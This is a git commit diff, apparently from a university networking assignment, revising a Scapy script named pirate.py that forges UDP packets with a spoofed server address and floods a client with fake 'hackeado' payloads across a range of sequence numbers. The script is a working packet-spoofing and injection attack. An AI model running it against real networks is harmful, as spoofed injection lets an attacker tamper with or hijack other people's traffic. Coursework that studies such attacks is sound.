22a3e9c9d7016424f3e8d79c264a72d84342ab14
Jimol1711 <juan.molina.l@ug.uchile.cl>
2024-11-22 18:14:08 -0300

    meh

--- T3/pirate.py
+++ T3/pirate.py
@@ -1,20 +1,22 @@
 #!/usr/bin/python3
-import sys # ('10.0.2.15', 53688)
-from scapy.all import UDP, IP, Raw, send
+import sys
+from scapy.all import UDP, IP, Raw, send, conf
 import random
+
+print(conf.route)
 
 def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
     print(f"Pirate is attacking! Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")
 
-    # Blindly craft packets with a range of potential payloads or sequence numbers
-    for seq_num in range(100, 1100):  # You can adjust the range as needed
-        # Create a fake payload, inserting the "hackeado" string
-        fake_payload = f"hackeado_seq_{seq_num}".encode()
+    # range of seq nums
+    for seq_num in range(0, 1000):
+        # hackeado fake payload
+        fake_payload = seq_num.to_bytes(2, 'big') + f"hackeado".encode()
 
-        # Build the forged packet
+        # forged packet
         pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_payload)
 
-        # Send the forged packet
+        # sending forged packet
         print(f"Injecting fake packet with sequence number {seq_num}")
         send(pirate_packet, verbose=0)
 
@@ -22,7 +24,7 @@ def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
 
 
 if len(sys.argv) != 5:
-    print("Usage: ./pirate.py <server_ip> <server_port> <client_ip> <client_port>")
+    print("Usage: ./pirate.py <server_host> <server_port> <client_ip> <client_port>")
     sys.exit(1)
 
 server_ip = sys.argv[1]
